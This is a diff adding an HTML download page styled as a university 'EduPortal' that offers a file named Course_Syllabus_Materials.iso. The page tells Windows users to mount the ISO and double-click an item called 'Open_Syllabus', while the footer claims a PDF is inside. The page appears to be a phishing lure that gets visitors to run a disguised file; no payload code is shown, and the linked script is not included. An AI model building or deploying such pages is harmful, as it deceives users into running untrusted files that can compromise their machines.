@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Course Materials Portal | University Learning System</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📚</text></svg>">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <span class="brand-icon">📚</span>
+                <span class="brand-text">EduPortal</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#" class="nav-link active">Home</a></li>
+                <li><a href="#" class="nav-link">Courses</a></li>
+                <li><a href="#" class="nav-link">Resources</a></li>
+                <li><a href="#" class="nav-link">Support</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-container">
+                <h1 class="hero-title">Course Materials Ready for Download</h1>
+                <p class="hero-subtitle">Your requested academic resources are prepared and waiting</p>
+                <div class="hero-badge">
+                    <span class="badge-icon">🔒</span>
+                    <span class="badge-text">Secure Academic Portal</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Download Card -->
+        <section class="download-section">
+            <div class="download-card">
+                <div class="card-header">
+                    <div class="file-icon">📁</div>
+                    <div class="file-info">
+                        <h2 class="file-name">Course_Syllabus_Materials.iso</h2>
+                        <p class="file-meta">Academic Resource Package • 2.4 MB • Version 2024.1</p>
+                    </div>
+                </div>
+                
+                <div class="card-body">
+                    <div class="progress-container" id="progressContainer" style="display: none;">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                        <p class="progress-text" id="progressText">Preparing download...</p>
+                    </div>
+                    
+                    <div class="download-ready" id="downloadReady">
+                        <p class="ready-text">Your materials are ready. Click the button below to begin.</p>
+                    </div>
+                    
+                    <div class="button-group">
+                        <button class="btn btn-primary" id="downloadBtn">
+                            <span class="btn-icon">⬇️</span>
+                            <span class="btn-text">Download Course Materials</span>
+                        </button>
+                        <button class="btn btn-secondary" id="manualDownloadBtn">
+                            <span class="btn-text">Manual Download</span>
+                        </button>
+                    </div>
+                    
+                    <p class="file-hash">
+                        <span class="hash-label">SHA-256:</span>
+                        <code class="hash-value" id="fileHash">Calculating...</code>
+                    </p>
+                </div>
+                
+                <div class="card-footer">
+                    <p class="footer-text">
+                        <span class="warning-icon">ℹ️</span>
+                        After downloading, double-click the ISO file to mount it, then open the PDF inside.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Instructions Section -->
+        <section class="instructions">
+            <h3 class="section-title">Installation Instructions</h3>
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h4>Download the ISO</h4>
+                        <p>Click the download button above to save the course materials package to your computer.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h4>Mount the ISO</h4>
+                        <p>Double-click the downloaded <code>Course_Syllabus_Materials.iso</code> file. Windows will automatically mount it as a virtual drive.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h4>Open the Syllabus</h4>
+                        <p>Inside the mounted drive, double-click <code>Open_Syllabus</code> to view your course materials.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- System Requirements -->
+        <section class="requirements">
+            <h3 class="section-title">System Requirements</h3>
+            <ul class="requirements-list">
+                <li>✅ Windows 10 or Windows 11</li>
+                <li>✅ 64-bit operating system</li>
+                <li>✅ Ability to mount ISO files (built into Windows)</li>
+                <li>✅ PDF reader for course materials</li>
+            </ul>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <p class="footer-text">© 2024 EduPortal Academic Services. All rights reserved.</p>
+            <p class="footer-links">
+                <a href="#">Privacy Policy</a> •
+                <a href="#">Terms of Use</a> •
+                <a href="#">Accessibility</a>
+            </p>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay -->
+    <div class="overlay" id="overlay" style="display: none;">
+        <div class="overlay-content">
+            <div class="spinner"></div>
+            <p class="overlay-text">Preparing your download...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
